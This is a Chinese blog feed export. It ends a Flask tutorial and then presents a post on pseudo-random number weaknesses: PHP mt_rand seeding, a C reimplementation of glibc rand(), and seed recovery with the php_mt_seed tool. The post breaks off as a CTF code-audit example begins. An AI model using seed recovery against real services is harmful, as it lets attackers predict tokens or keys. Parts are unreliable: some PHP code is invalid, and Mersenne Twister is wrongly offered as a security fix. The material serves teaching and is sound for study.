punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/greet/&lt;name&gt;'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">greet</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Hello, </span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">!"</span></span><span class="token comment"># 启动应用</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="三、Flask常用模块"><a href="#三、Flask常用模块" class="headerlink" title="三、Flask常用模块"></a>三、Flask常用模块</h1><h2 id="3-1-Flask"><a href="#3-1-Flask" class="headerlink" title="3.1 Flask"></a>3.1 Flask</h2><h3 id="3-1-1-Flask类的基本使用"><a href="#3-1-1-Flask类的基本使用" class="headerlink" title="3.1.1 Flask类的基本使用"></a>3.1.1 Flask类的基本使用</h3><p><strong>用途</strong>：核心模块，用于创建和管理 Flask 应用程序。</p><p><strong>示例</strong>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flaskapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"Hello, Flask!"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>app = Flask(__name__)</code> 是 Flask 应用的基础代码，它用于创建一个 Flask 应用实例。</p><h3 id="1-Flask-类"><a href="#1-Flask-类" class="headerlink" title="1. Flask 类"></a><strong>1. <code>Flask</code> 类</strong></h3><ul><li><code>Flask</code> 是 Flask 框架提供的核心类，负责处理 HTTP 请求、管理路由、加载配置等功能。</li><li>通过实例化 <code>Flask</code> 类，可以生成一个应用对象，用于组织和运行整个 Web 应用。</li></ul><h3 id="2-name-参数"><a href="#2-name-参数" class="headerlink" title="2. __name__ 参数"></a><strong>2. <code>__name__</code> 参数</strong></h3><ul><li><code>__name__</code>是 Python 的特殊变量，用于标识当前模块的名字。<ul><li>如果该模块是直接运行的脚本，<code>__name__</code> 的值为 <code>'__main__'</code>。</li><li>如果该模块是被导入的，<code>__name__</code> 的值为模块的名称。</li></ul></li><li>在 Flask 中，<code>__name__</code>的作用<ul><li><strong>确定应用的根路径</strong>：Flask 使用它定位应用所在的目录，这对加载静态文件（如 CSS、JS）和模板文件（如 HTML）至关重要。</li></ul></li></ul><h3 id="3-app-变量"><a href="#3-app-变量" class="headerlink" title="3. app 变量"></a><strong>3. <code>app</code> 变量</strong></h3><ul><li><p><code>app</code> 是通过 <code>Flask</code> 类实例化得到的对象，它代表了整个 Flask 应用实例。</p></li><li><p>它是 Web 应用的核心，用于注册路由、处理请求、配置应用、管理扩展等。</p></li><li><p>常见用法：</p><p><strong>定义路由</strong>：</p></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">"Hello, Flask!"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>​       <strong>运行应用：</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><blockquote><p>总结：<code>app = Flask(__name__)</code> 是 Flask 应用开发的起点，用来初始化一个 Web 应用对象。<code>Flask</code> 类负责提供应用的功能，而 <code>__name__</code> 帮助框架定位资源路径和运行环境。</p></blockquote><h3 id="3-1-2-监听0-0-0-0和127-0-0-1的区别"><a href="#3-1-2-监听0-0-0-0和127-0-0-1的区别" class="headerlink" title="3.1.2 监听0.0.0.0和127.0.0.1的区别"></a>3.1.2 监听0.0.0.0和127.0.0.1的区别</h3><p>app.run(host=‘0.0.0.0’,port=5001) 和app.run(host=‘127.0.0.1’,port=5001) </p><blockquote><p><code>app.run(host='0.0.0.0', port=5001)</code> 和 <code>app.run(host='127.0.0.1', port=5001)</code> 都是启动 Flask 应用的方法，但它们在 <strong>监听地址</strong> 和 <strong>访问方式</strong> 上存在差异。以下是详细解释：</p><h3 id="1-共同点"><a href="#1-共同点" class="headerlink" title="1. 共同点"></a>1. <strong>共同点</strong></h3><ul><li><strong>功能</strong>：两者都用于启动 Flask 开发服务器，监听指定的主机地址和端口。</li><li><strong>端口号</strong>：两者都监听 <code>5001</code> 端口，可以通过浏览器或 HTTP 客户端访问。</li></ul><h3 id="2-差异：监听地址（host-参数）"><a href="#2-差异：监听地址（host-参数）" class="headerlink" title="2. 差异：监听地址（host 参数）"></a>2. <strong>差异：监听地址（<code>host</code> 参数）</strong></h3><h4 id="host-0-0-0-0"><a href="#host-0-0-0-0" class="headerlink" title="host='0.0.0.0'"></a><strong><code>host='0.0.0.0'</code></strong></h4><ul><li>含义：<ul><li><code>0.0.0.0</code> 是一个特殊的 IP 地址，表示<strong>监听所有网络接口</strong>（包括本地接口和外部接口）。</li></ul></li><li><strong>结果</strong>：<ul><li>应用可以被<strong>本机（localhost）和同一局域网中的其他设备</strong>访问。</li><li>示例：<ul><li>本地访问：<code>http://127.0.0.1:5001</code></li><li>局域网访问：<code>http://&lt;你的局域网 IP&gt;:5001</code>（如 <code>http://192.168.1.100:5001</code>）</li></ul></li></ul></li></ul><h4 id="host-127-0-0-1"><a href="#host-127-0-0-1" class="headerlink" title="host='127.0.0.1'"></a><strong><code>host='127.0.0.1'</code></strong></h4><ul><li>含义：<ul><li><code>127.0.0.1</code> 是本地回环地址（localhost），只监听本地接口。</li></ul></li><li>结果：<ul><li>应用<strong>只能被本机访问</strong>，无法被其他设备访问。</li><li>示例：<ul><li>本地访问：<code>http://127.0.0.1:5001</code></li><li>局域网设备无法访问。</li></ul></li></ul></li></ul><h3 id="3-实际用途"><a href="#3-实际用途" class="headerlink" title="3.实际用途"></a>3.<strong>实际用途</strong></h3><img src="/2024/12/04/qian-hou-duan-kai-fa/flask-kuang-jia/%E6%88%AA%E5%B1%8F2024-12-06%2010.41.55.png" alt="实际用途" style="zoom:50%;"><h3 id="4-安全性注意事项"><a href="#4-安全性注意事项" class="headerlink" title="4. 安全性注意事项"></a>4. <strong>安全性注意事项</strong></h3><ul><li>开发环境：<ul><li>Flask 自带的开发服务器不适合生产环境，<code>host='0.0.0.0'</code> 时需特别小心，避免暴露到公网。</li></ul></li><li>生产环境：<ul><li>使用专业的 WSGI 服务器（如 <strong>gunicorn</strong> 或 <strong>uWSGI</strong>）配合反向代理服务器（如 Nginx）运行应用，提供更高的性能和安全性。</li></ul></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><ul><li>**<code>host='127.0.0.1'</code>**：仅限本机访问，适合安全性要求较高的开发场景。</li><li>**<code>host='0.0.0.0'</code>**：允许外部设备访问，适合局域网测试或需要共享的场景，但需注意潜在的安全风险。</li></ul></blockquote><h2 id="3-2-jsonify"><a href="#3-2-jsonify" class="headerlink" title="3.2 jsonify"></a>3.2 jsonify</h2><p><strong>用途</strong>：将 Python 数据结构（如字典、列表等）转换为 JSON 格式并返回 HTTP 响应。</p><p><strong>特点</strong>：自动设置响应的 <code>Content-Type</code> 为 <code>application/json</code>。</p><p><strong>示例</strong>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> jsonify<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/data'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> jsonify<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token number">30</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-3-request"><a href="#3-3-request" class="headerlink" title="3.3 request"></a>3.3 request</h2><p><strong>用途</strong>：获取客户端发送的 HTTP 请求信息，包括数据、头部、方法等。</p><p><strong>常用方法</strong>：</p><ul><li><code>request.args</code>：获取查询参数（GET 请求）。</li><li><code>request.form</code>：获取表单数据（POST 请求）。</li><li><code>request.json</code>：获取 JSON 格式的数据。</li></ul><p><strong>示例</strong>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> request<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/form'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">form</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    name <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Hello, </span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">!"</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-4-redirect"><a href="#3-4-redirect" class="headerlink" title="3.4 redirect"></a>3.4 redirect</h2><p><strong>用途</strong>：重定向到指定的 URL。</p><p><strong>特点</strong>：通常与 HTTP 状态码 302 或 301 一起使用。</p><p><strong>示例</strong>：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> redirect<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/old'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">old</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/new'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-5-render-template"><a href="#3-5-render-template" class="headerlink" title="3.5 render_template"></a>3.5 <strong>render_template</strong></h2><ul><li><strong>用途</strong>：渲染模板文件（如 HTML），动态生成网页内容。</li><li><strong>特点</strong>：使用 Jinja2 模板引擎，支持变量替换和逻辑控制。</li><li><strong>示例</strong>：</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> render_template<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/profile/&lt;name&gt;'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">profile</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'profile.html'</span><span class="token punctuation">,</span> username<span class="token operator">=</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 前后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前后端开发 </tag>
            
            <tag> python </tag>
            
            <tag> Flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随机数安全</title>
      <link href="/2024/12/04/mi-ma-xue-suan-fa-an-quan/sui-ji-shu-an-quan/"/>
      <url>/2024/12/04/mi-ma-xue-suan-fa-an-quan/sui-ji-shu-an-quan/</url>
      
        <content type="html"><![CDATA[<h1 id="一、伪随机数"><a href="#一、伪随机数" class="headerlink" title="一、伪随机数"></a>一、伪随机数</h1><h2 id="1-1-伪随机数的概念"><a href="#1-1-伪随机数的概念" class="headerlink" title="1.1 伪随机数的概念"></a>1.1 伪随机数的概念</h2><p><strong>伪随机数</strong>（Pseudo-Random Number）是通过确定性算法生成的一系列数字，这些数字看似随机，但实际上是由一个初始值（种子，seed）通过特定的数学公式计算得到的。因此，伪随机数在本质上是<strong>可预测</strong>的，只要种子值和生成算法相同，输出的序列也将完全相同。</p><p>一般伪随机数分为两类：</p><ul><li>强伪随机数：难以预测的随机数</li><li>弱伪随机数：容易预测的随机数（一般是漏洞高发点）</li></ul><h2 id="1-2-伪随机数的特点"><a href="#1-2-伪随机数的特点" class="headerlink" title="1.2 伪随机数的特点"></a>1.2 伪随机数的特点</h2><ul><li><p>可重复性<br>伪随机数的生成依赖于种子值，使用相同的种子可以生成相同的随机序列，这使得它在调试和测试中非常有用。</p></li><li><p>近似随机性<br>虽然伪随机数是通过确定性算法生成的，但它们在统计特性上接近真正的随机数，满足均匀分布、独立性等随机性要求，适用于大多数应用场景。</p></li><li><p>效率高<br>伪随机数生成通常比真随机数更快，且不依赖外部物理设备，易于在软件中实现。</p></li></ul><h2 id="1-3-真随机数与伪随机数的区别"><a href="#1-3-真随机数与伪随机数的区别" class="headerlink" title="1.3 真随机数与伪随机数的区别"></a>1.3 真随机数与伪随机数的区别</h2><img src="/2024/12/04/mi-ma-xue-suan-fa-an-quan/sui-ji-shu-an-quan/%E6%88%AA%E5%B1%8F2024-12-04%2010.15.27.png" alt="真随机数与伪随机数的区别" style="zoom:50%;"><h1 id="二、伪随机数的安全问题"><a href="#二、伪随机数的安全问题" class="headerlink" title="二、伪随机数的安全问题"></a>二、伪随机数的安全问题</h1><p>确定的算法+随机数种子=&gt;可预测的随机数序列。</p><h2 id="2-1-可预测性问题"><a href="#2-1-可预测性问题" class="headerlink" title="2.1 可预测性问题"></a>2.1 可预测性问题</h2><h4 id="2-1-1-问题描述"><a href="#2-1-1-问题描述" class="headerlink" title="2.1.1 问题描述"></a>2.1.1 问题描述</h4><p>伪随机数生成器（PRNG）的输出依赖于<strong>种子值</strong>，一旦种子值被攻击者知道或猜测到，后续生成的所有伪随机数都可以被预测。这对<strong>密码学</strong>中的密钥生成、会话密钥等至关重要的数据是致命的。</p><h4 id="2-1-2-实例"><a href="#2-1-2-实例" class="headerlink" title="2.1.2 实例"></a>2.1.2 实例</h4><p><strong>Linux内核的随机数预测漏洞</strong>（2016年）：由于种子熵不足，攻击者通过推测种子值预测了伪随机数，导致SSH会话密钥被破解。</p><h4 id="2-1-3-解决方案"><a href="#2-1-3-解决方案" class="headerlink" title="2.1.3 解决方案"></a>2.1.3 解决方案</h4><p>使用<strong>加密安全伪随机数生成器（CSPRNG）</strong>。CSPRNG通过使用安全的哈希函数、对称加密等算法，使得即使种子部分暴露，也无法预测未来的输出。</p><p>增加<strong>种子的熵</strong>（Entropy），从不可预测的物理来源获取种子，例如鼠标移动、键盘输入、系统噪声等。</p><h2 id="2-2-周期性问题"><a href="#2-2-周期性问题" class="headerlink" title="2.2 周期性问题"></a>2.2 <strong>周期性问题</strong></h2><h3 id="2-2-1-问题描述"><a href="#2-2-1-问题描述" class="headerlink" title="2.2.1 问题描述"></a>2.2.1 问题描述</h3><p>伪随机数生成器具有有限的周期，周期一旦被攻击者识别，输出的伪随机数序列就会重复。这在<strong>长时间运行的系统</strong>中会导致随机性退化，从而影响安全性。</p><h3 id="2-2-2-实例"><a href="#2-2-2-实例" class="headerlink" title="2.2.2 实例"></a>2.2.2 实例</h3><p>某些使用线性同余法（LCG）的系统在长时间运行后，其伪随机数输出进入了一个短周期，导致系统输出模式被攻击者利用。</p><h3 id="2-2-3-解决方案"><a href="#2-2-3-解决方案" class="headerlink" title="2.2.3 解决方案"></a>2.2.3 解决方案</h3><p>选择周期极长的PRNG，例如<strong>梅森旋转算法（Mersenne Twister, MT19937）</strong>。</p><p>结合多个随机数生成器，或在周期耗尽前重新注入新的随机熵。</p><h1 id="三、伪随机数安全问题实例"><a href="#三、伪随机数安全问题实例" class="headerlink" title="三、伪随机数安全问题实例"></a>三、伪随机数安全问题实例</h1><h2 id="3-1-PHP伪随机数生成"><a href="#3-1-PHP伪随机数生成" class="headerlink" title="3.1 PHP伪随机数生成"></a>3.1 PHP伪随机数生成</h2><p>以PHP中的随机数作为示例，在PHP中，常用的两个随机数生成函数为rand()及mt_rand()。</p><p>rand()主要依赖glibc的random()，实现原理如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> r<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">31</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">16807LL</span> <span class="token operator">*</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">2147483647</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">2147483647</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">31</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">34</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">34</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">344</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">344</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">1000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>r<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码首先初始化数组 <code>r</code> 的第一个元素为 1，然后通过一个线性同余生成器算法填充数组的前 31 个元素。接着，它将前 31 个元素的部分数值复制到数组的第 31 到 33 个位置。然后，从第 34 个元素开始，数组的每个元素都是前 31 个元素和前 3 个元素的和。最后，从第 344 个元素开始，程序打印出数组中每个元素的高 31 位值。这里使用了类型转换 <code>(unsigned int)</code> 和右移操作 <code>&gt;&gt; 1</code> 来获取高 31 位。</p><p>从中发现，当随机数多于32位时，可以对后续的随机数进行预测。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">31</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">34</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">34</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">344</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">344</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">1000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        r<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">+</span> r<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在mt_rand函数中，可以根据mt_srand进行播种，如：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$seed</span> <span class="token operator">=</span> <span class="token number">6666</span><span class="token punctuation">;</span><span class="token function">mt_srand</span> <span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ss</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当随机数种子已知时，生成的随机数序列一致：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$seed</span> <span class="token operator">=</span> <span class="token number">6666</span><span class="token punctuation">;</span><span class="token function">mt_srand</span> <span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token operator">=</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/04/mi-ma-xue-suan-fa-an-quan/sui-ji-shu-an-quan/%E6%88%AA%E5%B1%8F2024-12-04%2010.58.57.png" alt="两次运行的结果一致" style="zoom:50%;"><p>两次运行的结果一致。</p><h2 id="3-2-逆推伪随机数种子"><a href="#3-2-逆推伪随机数种子" class="headerlink" title="3.2 逆推伪随机数种子"></a>3.2 逆推伪随机数种子</h2><p>同样的种子能生成固定的随机数，那么也能根据随机数在某种程度上逆推种子，可以通过开源工具php_mt_seed可以实现：</p><p><a href="https://github.com/openwall/php_mt_seed">https://github.com/openwall/php_mt_seed</a> 【地址】</p><ul><li>用法示例</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ php5 <span class="token parameter variable">-r</span> <span class="token string">'mt_srand(1234567890); echo mt_rand(), "\n";'</span><span class="token number">1328851649</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">time</span> ./php_mt_seed <span class="token number">1328851649</span>    Pattern: EXACT    Version: <span class="token number">3.0</span>.7 to <span class="token number">5.2</span>.0    Found <span class="token number">0</span>, trying 0xfc000000 - 0xffffffff, speed <span class="token number">16261.0</span> Mseeds/s     Version: <span class="token number">5.2</span>.1+    Found <span class="token number">0</span>, trying 0x1e000000 - 0x1fffffff, speed <span class="token number">91.8</span> Mseeds/s     seed <span class="token operator">=</span> 0x1fd65f9a <span class="token operator">=</span> <span class="token number">534142874</span> <span class="token punctuation">(</span>PHP <span class="token number">7.1</span>.0+<span class="token punctuation">)</span>    Found <span class="token number">1</span>, trying 0x26000000 - 0x27ffffff, speed <span class="token number">91.9</span> Mseeds/s     seed <span class="token operator">=</span> 0x273a3517 <span class="token operator">=</span> <span class="token number">658126103</span> <span class="token punctuation">(</span>PHP <span class="token number">5.2</span>.1 to <span class="token number">7.0</span>.x<span class="token punctuation">;</span> HHVM<span class="token punctuation">)</span>    Found <span class="token number">2</span>, trying 0x48000000 - 0x49ffffff, speed <span class="token number">91.9</span> Mseeds/s     seed <span class="token operator">=</span> 0x499602d2 <span class="token operator">=</span> <span class="token number">1234567890</span> <span class="token punctuation">(</span>PHP <span class="token number">5.2</span>.1 to <span class="token number">7.0</span>.x<span class="token punctuation">;</span> HHVM<span class="token punctuation">)</span>    seed <span class="token operator">=</span> 0x499602d2 <span class="token operator">=</span> <span class="token number">1234567890</span> <span class="token punctuation">(</span>PHP <span class="token number">7.1</span>.0+<span class="token punctuation">)</span>    Found <span class="token number">4</span>, trying 0xfe000000 - 0xffffffff, speed <span class="token number">91.9</span> Mseeds/s     Found <span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于是逆推，可能存在多值。</p><p>提供的随机数序列长度越长，逆推越精确。</p><h2 id="3-3-实例分析"><a href="#3-3-实例分析" class="headerlink" title="3.3 实例分析"></a>3.3 实例分析</h2><h3 id="3-3-1-代码审计"><a href="#3-3-1-代码审计" class="headerlink" title="3.3.1 代码审计"></a>3.3.1 代码审计</h3><p>以某国内赛事的题目为例讲解伪随机数安全：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">random_str</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"32"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$set</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">,</span> <span class="token string 